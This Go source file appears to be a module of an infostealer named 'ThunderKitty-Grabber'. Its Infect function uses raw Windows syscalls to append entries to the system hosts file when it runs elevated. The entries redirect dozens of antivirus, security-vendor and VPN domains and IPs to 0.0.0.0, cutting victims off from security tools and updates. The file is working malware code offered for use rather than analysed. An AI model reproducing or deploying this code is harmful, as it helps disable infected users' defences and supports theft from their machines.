package Hosts

import (
	Common "ThunderKitty-Grabber/utils/common"
	"syscall"
)

// WHY THE FUCK ARE WE USING SYSCALLS HERE???
func Infect() {
	if !Common.IsElevated() {
		return
	}
	fp := `C:\Windows\System32\Drivers\etc\hosts`
	fn, _ := syscall.UTF16PtrFromString(fp)
	handle, _ := syscall.CreateFile(fn, syscall.GENERIC_WRITE, syscall.FILE_SHARE_READ, nil, syscall.OPEN_EXISTING, syscall.FILE_ATTRIBUTE_NORMAL, 0)
	defer syscall.CloseHandle(handle)
	syscall.SetFilePointer(handle, 0, nil, syscall.FILE_END)
	var written uint32
	syscall.WriteFile(handle, []byte(`
	0.0.0.0 212.23.151.164
	0.0.0.0 www.gdatasoftware.com
	0.0.0.0 gdatasoftware.com
	0.0.0.0 212.23.151.164
	0.0.0.0 www.basicsprotection.com
	0.0.0.0 basicsprotection.com
	0.0.0.0 3.111.153.145
	0.0.0.0 www.fortinet.com
	0.0.0.0 fortinet.com
	0.0.0.0 3.1.92.70
	0.0.0.0 www.f-secure.com
	0.0.0.0 f-secure.com
	0.0.0.0 23.198.76.113
	0.0.0.0 www.eset.com
	0.0.0.0 eset.com
	0.0.0.0 91.228.167.128
	0.0.0.0 www.escanav.com
	0.0.0.0 escanav.com
	0.0.0.0 67.222.129.224
	0.0.0.0 www.emsisoft.com
	0.0.0.0 emsisoft.com
	0.0.0.0 104.20.206.62
	0.0.0.0 www.drweb.com
	0.0.0.0 drweb.com
	0.0.0.0 178.248.233.94
	0.0.0.0 www.cyren.com
	0.0.0.0 cyren.com
	0.0.0.0 216.163.188.84
	0.0.0.0 www.cynet.com
	0.0.0.0 cynet.com
	0.0.0.0 172.67.38.94
	0.0.0.0 www.comodosslstore.com
	0.0.0.0 comodosslstore.com
	0.0.0.0 172.67.28.161
	0.0.0.0 www.clamav.net
	0.0.0.0 clamav.net
	0.0.0.0 198.148.79.54
	0.0.0.0 www.eset.com
	0.0.0.0 eset.com
	0.0.0.0 91.228.167.128
	0.0.0.0 www.totalav.com
	0.0.0.0 totalav.com
	0.0.0.0 34.117.198.220
	0.0.0.0 www.bitdefender.co.uk
	0.0.0.0 bitdefender.co.uk
	0.0.0.0 172.64.144.176
	0.0.0.0 www.baidu.com
	0.0.0.0 baidu.com
	0.0.0.0 39.156.66.10
	0.0.0.0 www.avira.com
	0.0.0.0 avira.com
	0.0.0.0 52.58.28.12
	0.0.0.0 www.avast.com
	0.0.0.0 avast.com
	0.0.0.0 2.22.100.83
	0.0.0.0 www.arcabit.pl
	0.0.0.0 arcabit.pl
	0.0.0.0 188.166.107.22
	0.0.0.0 www.surfshark.com
	0.0.0.0 surfshark.com
	0.0.0.0 104.18.120.34
	0.0.0.0 www.nordvpn.com
	0.0.0.0 nordvpn.com
	0.0.0.0 104.17.49.74
	`), &written, nil)
}
